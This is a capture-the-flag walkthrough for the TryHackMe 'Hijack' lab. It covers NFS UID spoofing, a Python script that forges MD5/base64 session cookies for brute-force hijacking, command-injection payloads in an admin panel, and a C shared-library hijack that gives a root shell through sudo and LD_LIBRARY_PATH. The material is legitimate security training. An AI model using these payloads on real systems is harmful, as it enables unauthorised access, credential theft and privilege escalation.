---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - Scripting
  - Cookie-HJ
  - RCE
  - Sudo
  - Lib-HJ
---
https://tryhackme.com/room/hijack/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.8.128 hijack.thm
```
# Scanning
```console
$ nmap -p21,22,80,111,2049,40108,40594,40771,52380 -sV -sC hijack.thm

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35959/udp6  mountd
|   100005  1,2,3      40771/tcp   mountd
|   100005  1,2,3      41352/udp   mountd
|   100005  1,2,3      46938/tcp6  mountd
|   100021  1,3,4      32902/udp   nlockmgr
|   100021  1,3,4      38936/tcp6  nlockmgr
|   100021  1,3,4      40108/tcp   nlockmgr
|   100021  1,3,4      42291/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
40108/tcp open  nlockmgr 1-4 (RPC #100021)
40594/tcp open  mountd   1-3 (RPC #100005)
40771/tcp open  mountd   1-3 (RPC #100005)
52380/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## NFS
Show [NFS](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting) mount point:
```console
$ showmount -e hijack.thm

Export list for hijack.thm:
/mnt/share *
```
Mount the **NFS folder**:
```console
$ sudo mkdir /mnt/share

$ sudo mount -t nfs hijack.thm:/mnt/share /mnt/share
```
The **NFS folder** is only accessible by **UID 1003**:
```console
$ ls -l /mnt

drwx------ 2 1003 1003 4096 Aug  8  2023 share
```
Create **user jack** with **UID 1003**:
```console
$ sudo groupadd -g 1003 jack

$ sudo useradd -u 1003 -g 1003 -M jack

$ sudo passwd jack
```
Get **FTP credentials**:
```console
$ sudo -u jack ls /mnt/share
for_employees.txt

$ sudo -u jack tail -n 1 /mnt/share/for_employees.txt
ftpuser:W3stV1rg1n14M0un741nM4m4
```
## FTP
Connect to **FTP server**:
```console
$ ftp -i hijack.thm
Connected to hijack.thm.
220 (vsFTPd 3.0.3)
Name (hijack.thm:kali): ftpuser
331 Please specify the password.
Password: W3stV1rg1n14M0un741nM4m4
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
List and download **FTP files**:
```console
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
226 Directory send OK.

ftp> mget .from_admin.txt .passwords_list.txt
local: .from_admin.txt remote: .from_admin.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
226 Transfer complete.
368 bytes received in 9.8e-05 seconds (3.58 Mbytes/s)
local: .passwords_list.txt remote: .passwords_list.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
226 Transfer complete.
3150 bytes received in 0.000128 seconds (23.5 Mbytes/s)

ftp> quit
221 Goodbye.
```
Found **user rick**, and that **user admin** is using one password from the **password list**:
```console
$ cat .from_admin.txt

To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```
## Cookie Hijacking
In the website, created user with credentials `jack:password`. After log in, the **PHPSESSID cookie** has base64 format: `amFjazo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OQ%3D%3D`.

Decoded the **cookie** using [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=YW1GamF6bzFaalJrWTJNellqVmhZVGMyTldRMk1XUTRNekkzWkdWaU9EZ3lZMlk1T1ElM0QlM0Q). The **cookie** combines the user credentials using **MD5 hash format**: `jack:5f4dcc3b5aa765d61d8327deb882cf99`.

Generate every possible **cookie** at `cookies.txt` with a Python script:
```python
import base64
import hashlib
from pathlib import Path

passwords = Path('.passwords_list.txt').read_bytes().splitlines()

with open('cookies.txt', 'wb') as f:
    for user in (b'admin', b'rick'):
        for password in passwords:
            md5_pass = hashlib.md5(password).hexdigest().encode()
            phpsessid = base64.b64encode(user + b':' + md5_pass) + b'\n'
            f.write(phpsessid)
```
Get valid cookie for **user admin**:
```console
$ gobuster fuzz -H 'Cookie: PHPSESSID=FUZZ' -u http://hijack.thm/index.php -q -w ./cookies.txt --exclude-length 487

Found: [Status=200] [Length=435] [Word=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=] http://hijack.thm/index.php
```
Steal **user admin** session by setting the **cookie** value to `PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU`.
# Exploitation
The [administration panel](http://hijack.thm/administration.php) is a service status checker. For example, the output of `ssh` is:
```text
* ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2025-04-08 02:43:35 UTC; 49min ago
  Process: 1018 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
 Main PID: 1129 (sshd)
    Tasks: 1
   Memory: 1.3M
      CPU: 9ms
   CGroup: /system.slice/ssh.service
           `-1129 /usr/sbin/sshd -D
```
The probable **backend execution** is `systemctl status <SERVICE>`.
Successful **code execution** by inputting `$(whoami)`:
```text
* www-data.service
   Loaded: not-found (Reason: No such file or directory)
   Active: inactive (dead)
```
Get **user rick credentials** by inputting `'' && cat config.php`:
```php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```
Connect as **user rick** via SSH using **stolen credentials**:
```bash
ssh rick@hijack.thm
```
Read **user flag**:
```bash
cat /home/rick/user.txt
```
# Post-Exploitation
Loading **library paths (LD_LIBRARY_PATH)** is allowed when using `sudo`:
```console
$ sudo -l

Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
Display **shared libraries** loaded by `/usr/sbin/apache2`:
```console
$ ldd /usr/sbin/apache2

linux-vdso.so.1 =>  (0x00007ffea69de000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f29e75db000)
libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f29e73b4000)
libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f29e7182000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f29e6f65000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f29e6b9b000)
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f29e6963000)
libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f29e673a000)
libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f29e6535000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f29e6331000)
/lib64/ld-linux-x86-64.so.2 (0x00007f29e7af0000)
```
Create **malicious library** `shell.c` to spawn a **root shell**:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

static void hijack()
{
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0); // setuid(0);
    setresgid(0, 0, 0); // setgid(0);
    system("/bin/bash -p");
}
```
Compile it and name it as one of the **loaded shared libraries**:
```bash
gcc -fPIC -nostartfiles -shared -o /tmp/libcrypt.so.1 ./shell.c
```
Execute `/usr/sbin/apache2` to load the **malicious library**:
```console
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2

# whoami
root
```
Read the **root flag**:
```bash
cat /root/root.txt
```